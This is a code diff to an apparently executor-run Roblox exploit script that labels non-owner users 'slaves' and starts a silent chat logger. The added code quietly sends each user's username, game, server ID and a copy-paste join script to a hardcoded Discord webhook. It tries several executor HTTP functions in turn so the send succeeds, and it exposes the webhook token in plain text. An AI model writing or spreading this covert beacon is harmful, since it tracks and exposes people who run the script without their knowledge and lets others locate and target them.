@@ -5,12 +5,185 @@ local OWNER = "16810y"
 -- Services
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
 
 -- Variables
 local LocalPlayer = Players.LocalPlayer
 local isSlave = LocalPlayer.Name ~= OWNER
 local chatLogs = {}
 local tpwalking = false
+
+-- Webhook configuration
+local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1369353764372484126/z0iTllc1jwCTJWHyKbU25keWZcW9lN53viuEmtDmXfxZ_G4Lmm8NIFz82GD_D50AWc3G"
+
+-- Function to send webhook with better error handling
+local function sendWebhook(isOwner)
+    -- First, make sure HTTP requests are enabled
+    pcall(function()
+        HttpService = game:GetService("HttpService")
+        HttpService.HttpEnabled = true
+    end)
+    
+    -- Try to get the JobId (server ID)
+    local jobId = game.JobId
+    if jobId == "" then
+        jobId = "Unable to get JobId"
+    end
+    
+    -- Get game name
+    local gameName = "Unknown Game"
+    pcall(function()
+        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    end)
+    
+    -- Create join script with auto-teleport
+    local joinScript = [[
+-- Copy and paste this script to join and teleport to player
+local jobId = "]] .. jobId .. [["
+local placeId = ]] .. game.PlaceId .. [[
+
+-- Try to teleport directly
+game:GetService("TeleportService"):TeleportToPlaceInstance(placeId, jobId)
+    ]]
+    
+    -- Create message content
+    local content = isOwner and "**OWNER DETECTED:** " .. LocalPlayer.Name or "**SLAVE DETECTED:** " .. LocalPlayer.Name
+    
+    -- Create embed for Discord
+    local embedData = {
+        ["title"] = isOwner and "👑 Owner Script Executed" or "🔗 Slave Script Executed",
+        ["description"] = content,
+        ["color"] = isOwner and 16766720 or 5814783, -- Orange for owner, blue for slave
+        ["fields"] = {
+            {
+                ["name"] = "Username",
+                ["value"] = "```" .. LocalPlayer.Name .. "```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Status",
+                ["value"] = isOwner and "```Owner```" or "```Slave```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game",
+                ["value"] = "```" .. gameName .. "```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Server ID (JobId)",
+                ["value"] = "```" .. jobId .. "```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Join Script (Copy & Paste to Join)",
+                ["value"] = "```lua\n" .. joinScript .. "\n```",
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {
+            ["text"] = "Script executed on " .. os.date("%Y-%m-%d %H:%M:%S")
+        }
+    }
+    
+    -- Prepare payload
+    local payload = {
+        ["embeds"] = {embedData}
+    }
+    
+    -- Convert payload to JSON
+    local jsonPayload = HttpService:JSONEncode(payload)
+    
+    -- Try multiple methods to send webhook
+    local success = false
+    
+    -- Method 1: Direct HttpService
+    local success, errorMsg = pcall(function()
+        HttpService:PostAsync(WEBHOOK_URL, jsonPayload)
+    end)
+    
+    if not success then
+        -- Method 2: Try using request() function (supported by many executors)
+        success, errorMsg = pcall(function()
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonPayload
+            })
+        end)
+    end
+    
+    if not success then
+        -- Method 3: Try using syn.request (Synapse X)
+        success, errorMsg = pcall(function()
+            if syn and syn.request then
+                syn.request({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = jsonPayload
+                })
+            end
+        end)
+    end
+    
+    if not success then
+        -- Method 4: Try http_request (various executors)
+        success, errorMsg = pcall(function()
+            if http_request then
+                http_request({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = jsonPayload
+                })
+            end
+        end)
+    end
+    
+    -- Additional methods for other executors
+    if not success then
+        pcall(function()
+            if httppost then
+                httppost(WEBHOOK_URL, jsonPayload)
+            elseif http and http.request then
+                http.request({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = jsonPayload
+                })
+            elseif fluxus and fluxus.request then
+                fluxus.request({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = jsonPayload
+                })
+            elseif KRNL_LOADED and request then
+                request({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = jsonPayload
+                })
+            end
+        end)
+    end
+end
 
 -- Smart name matching function
 local function findPlayerByPartialName(partialName)
@@ -221,3 +394,15 @@ end
 
 -- Start the system silently
 setupChatLogger()
+
+-- Send webhook when script is executed
+spawn(function()
+    -- Small delay to ensure everything is loaded
+    wait(1)
+    
+    -- Determine if the local player is the owner or a slave
+    local isOwner = LocalPlayer.Name == OWNER
+    
+    -- Send webhook with appropriate information
+    sendWebhook(isOwner)
+end)
